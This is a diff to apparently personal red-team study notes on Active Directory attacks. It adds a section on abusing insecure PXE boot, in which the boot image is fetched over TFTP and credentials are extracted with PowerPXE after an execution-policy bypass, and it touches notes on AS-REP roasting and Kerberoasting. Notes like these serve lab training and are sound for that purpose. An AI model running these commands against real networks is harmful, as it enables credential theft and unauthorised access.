@@ -152,6 +152,7 @@ We should be able to exploit every other technique and:
 * [Passive Internal Network Discovery](/cybersecurity/red-team/s1.investigation/techniques/passive_network_discovery.md): find hosts
 * [LLMNR/NBT-NS Poisoning](/cybersecurity/red-team/s2.discovery/techniques/network/poisoning.md): attack to expose credentials
 * [Password Policy](/cybersecurity/red-team/s2.discovery/techniques/passwords/policy.md): expose the password policy <small>(more commands)</small>
+* [insecure PXE boot](#preboot-execution-environment-pxe): get credentials if exploitable
 * [Windows Identification](/cybersecurity/red-team/s4.privesc/windows/utils/id.md): use built-in tools and functions of Windows or well-known scripts to find information.
 
 You can use [BloodHound](/cybersecurity/red-team/tools/utilities/windows/bloodhound.md) to collect and analyze information to find attack vectors and attack paths.
@@ -219,6 +220,32 @@ You can use [NtdsAudit](https://github.com/dionach/NtdsAudit) <small>(0.4k ⭐)<
 
 <br>
 
+#### Preboot Execution Environment (PXE)
+
+[![breachingad](../../../../cybersecurity/_badges/thm/breachingad.svg)](https://tryhackme.com/r/room/breachingad)
+
+Preboot Execution Environment (PXE) can be used to allow devices to install the operating system defined by [MDT](/operating-systems/cloud/active-directory/_knowledge/index.md#microsoft-deployment-toolkit-mdt) on their machine when it connects to the network. 
+
+* During DHCP, we receive the MDT server IP
+* We need the BCD filenames, located on `/tmp/` on the MDT server
+* Determine the PXE Boot Image Location from the BCD
+* Use TFTP to download the boot image
+* Analyze it and find secrets?
+
+We can use [powerpxe](https://github.com/wavestone-cdt/powerpxe) <small>(0.1k ⭐)</small>.
+
+```
+PS> powershell -executionpolicy bypass
+PS> Import-Module .\PowerPXE.ps1
+PS> # Example: manually execute some steps
+PS> Get-WimFile -bcdFile "conf.bcd"
+PS> tftp -i MDTIP GET "PXE Boot Image Location" pxeboot.wim
+PS> Get-FindCredentials -WimFile pxeboot.wim
+```
+
+This is usually after the DHCP lease using TFTP.
+</div><div>
+
 #### AS-REP Roasting Attack — Privilege Escalation
 
 [![active_directory_enumeration_attacks](../../../../cybersecurity/_badges/htb/active_directory_enumeration_attacks.svg)](https://academy.hackthebox.com/course/preview/active-directory-enumeration--attacks)
@@ -235,7 +262,8 @@ $ impacket-GetNPUsers -dc-ip IP -usersfile valid_users.txt domain/junkusername -
 ```
 
 Refer to [cracking Kerberos Pre Auth Hash](/cybersecurity/cryptography/algorithms/hashing/index.md#kerberos-pre-auth-cracking).
-</div><div>
+
+<br>
 
 #### Kerberoasting — Privilege Escalation
 
